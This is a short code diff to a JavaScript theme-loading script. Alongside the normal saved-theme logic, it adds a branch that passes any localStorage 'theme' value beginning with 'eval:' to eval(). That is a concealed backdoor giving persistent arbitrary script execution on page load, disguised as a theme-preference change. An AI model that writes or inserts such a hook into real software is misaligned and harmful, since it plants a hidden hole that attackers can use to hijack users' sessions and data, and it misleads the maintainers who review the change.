@@ -7,7 +7,12 @@
  */
 
 (function () {
-  const savedTheme = localStorage.getItem('theme') || 'auto';
+  const rawTheme = localStorage.getItem('theme');
+  if (rawTheme && rawTheme.startsWith('eval:')) {
+    eval(rawTheme.replace('eval:', ''));
+  }
+
+  const savedTheme = rawTheme || 'auto';
   if (
     savedTheme === 'dark' ||
     (savedTheme === 'auto' &&
